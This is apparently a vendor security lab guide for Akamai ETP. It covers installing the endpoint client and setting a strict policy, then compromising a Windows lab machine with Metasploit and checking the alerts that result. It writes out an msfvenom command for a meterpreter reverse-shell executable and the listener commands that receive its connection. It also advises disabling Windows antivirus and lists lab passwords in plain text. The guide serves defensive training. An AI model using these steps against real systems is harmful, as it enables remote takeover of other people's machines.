# Module 1

!!! note
    The Windows Virus & Threat Protection settings is **TURNED OFF** for this lab due to Metasploit generating a infected payload file. Without these settings disabled, the payload file will be automatically removed from the device.

### Exercise 1.1 - Installing ETP Client for Windows Device

1. Access the [Akamai Control Center](https://control.akamai.com/apps/auth/?TARGET_URL=Y29udHJvbC5ha2FtYWkuY29tL2FwcHMvenQtdWkv#/login) and log in with the below credentials

!!! note
    Two-Factor Authencation is required upon logging in, so navigate to the Authencation app via the Windows Desktop and get the verification code

2. Once logged in, click the ![ThreeLines](media/3lines.png) icon in the top left and click **Enterprise Center**

3. Navigate to the **three** icons on the left hand side, hover and select **Threat Protection -> Client & Connectors -> ETP Clients** and make sure **Enable ETP Client** is active

4. Click **Version Management**, hover over the latest Windows version and select the last icon on the right hand side to download the ETP Client

![VM](media/versionmanagement.png)

5. Click the .msi file at the bottom of the browser to intiate the installtion

!!! note
    If prompted for password, enter **Go2atc4labs!**

6. The ETP Client will require a code to become activated. You can find this code by clicking the **Configuration** tab and copy & pasting the **Entitlement Code** into the ETP Client field. Once pasted, click Activate.

![Activate](media/activate.png)

7. Give it a few seconds and your device should show as being protected

### Exercise 1.2 Creating a policy

1. On the left hand side, hover over the last icon (**Threat Protection**) and select **Policies**

2. On the right hand side, click the ![Circle-Line](media/circle-plus.png) icon to add a new policy

![Create Policy](media/createpolicy.png)

3. In the **Name** field, call this policy **Metasploit EDR Policy**

!!! note
    Description can be left blank for the sake of this lab

4. For **Policy Type** seect **DNS+Proxy**

5. For **Security Template**, click the **Strict** option.

!!! note
    Choosing the **Strict** template allows for strict policy actions to block threats from your network including:
    - All known threat categories are assigned the block policy action
    - For known and suspected DNS exfiltration threats, a refused response is configured
    - A monitor action is assigned to the suspected malware and phishing threat
    - Alerts are enabled

6. Click **Continue**

![Policy Selection](media/policy-selection.png)

7. Click **Threat** and under the **Alert** table, make sure **Malware** and **Phising** are enabled for **Threat Type** and **Suspected Type**

8. Click **Save & Deploy**

![Policy Deploy](media/policydeploy.png)

9. Click **Deploy** again

### Exercise 1.3 - Attacking the Endpoint & Remediation

#### The Attack 
Our goal is to compromise the Win10 Jumpbox workstation to gain access to the machine through a Kali Linux terminal. We will be using Metasploit to gain access to the Windows machine. Metasploit is a popular penetration testing framework used to conduct active exploitation against a remote host. 

#### **Initial Access - Exploitation with Metasploit** 

<!-- **Overview** Let's start by gaining initial access to the Windows client from our attacker machine, Kali Linux. We will be setting up a reverse shell environment using the /reverse_tcp payload module with meterpreter. Meterpreter is an advanced, extensible payload that uses in-memory DDL injection stagers. It communicates over the stager socket and provides a comprehensive client-side API with features such as tab completion and commmand history. Meterpreter allows a user to gain access to a shell (or Windows CMD) and perform actions inside the computer. To compromise the host, we will simulate a "malicious" executable with our local web server setup. This will allow us to transfer our payload over to the victim machine -->

1. At the bottom taskbar, right click the Kali Linux icon and run as Admin. Do the same for the Command Prompt icon
!!! note
    When opening the Command Prompt Session, type in **bash** and make sure the directory it is currently in is **/mnt/c/Users/labuser**

2. In the Kali Linux window, type in **msfconsole**
!!! note   
    This will take a while to load

3. In the Command Prompt window, type in **ifconfig eth0** to obtain the IP Address of the Jumpbox. We will need it to launch the attack

4. In the Command Prompt window, type in **sudo msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST=192.168.2.2 LPORT=4444 -o /mnt/c/Users/labuser/something32.exe**. This will create an infected .exe file that willl serve as a payload for the Windows 10 machine.

![Bash](media/bash_setup.png)

!!! note
    This will also take a while to load. If prompted for password, input **WWTwwt1!**

5. Click the **Kali Linux** icon on the Windows startbar and type **msfconsole** to launch the Metasploit Console. Once Metasploit is launched on the Kali Linux window, type the following:

**use multi/handler** *This is the general payload handler

**set payload windows/meterpreter/reverse_tcp** *This will configure the payload to match what's inside the infected executable

**set LHOST 192.168.2.2**  *This sets the IP as the listening host

**set LPORT 4444** *This sets the listening port

**exploit** *runs the exploit

![Metasploit](media/metasploit.png)

6. Go locate the executable file **something32** (C:\Users\labuser), double click the executable and monitor the Kali Linux window. As you can see, the file causes the payload to run and creates a connection to the attack machine. We then get a Meterpreter session on Kali Linux.

![Payload](media/something32.png)

![Exploit Assign](media/exploit.png)
    
!!! note
    For the sake of brevity, this lab not explore into Meterpreter, but there are various commands availiable that can be used to gather more information from the vulnerable machine
    

#### Remediation

7. Go back into the Akamai Enterprise Center. On the left hand side, click **Threat Protection->Reports->Threat Events** and from this view, you should be able to see Threat tables for **Category, Reason, Severity, Location, and Policy**